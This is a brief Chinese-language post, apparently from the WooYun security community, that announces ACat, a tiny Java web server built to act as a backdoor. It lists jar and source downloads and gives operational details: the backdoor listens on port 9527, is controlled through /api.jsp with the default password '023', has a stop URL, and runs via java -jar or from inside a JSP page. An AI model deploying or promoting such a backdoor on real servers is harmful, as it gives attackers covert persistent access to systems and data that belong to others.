Author:园长MM


下载：
ACat-jdk1.5.jar、ACat-附数据库驱动-jdk1.5.jar、 ACat-jdk.1.7.jar、ACat-附数据库驱动.jar

源码：
ACat-src.zip

描述：

这是一个用java实现的非常小(18kb)的webServer。之前在drops发了一个简单的demo：http://drops.wooyun.org/papers/869。这个也非常简单，只实现了几个servlet的api,不过已实现了后门相关的其他功能。启动成功后会开启9527端口，然后访问:http://xxx.com:9527/api.jsp，密码：023。

停止服务:http://xxx.com:9527/api.jsp?action=stop

密码和端口配置在jar里面的server.properties：



运行方式:java -jar ACat.jar或者在jsp里面调用。



如果需要连接数据库需要下载：ACat-附数据库驱动.jar，或者自行添加相关jar。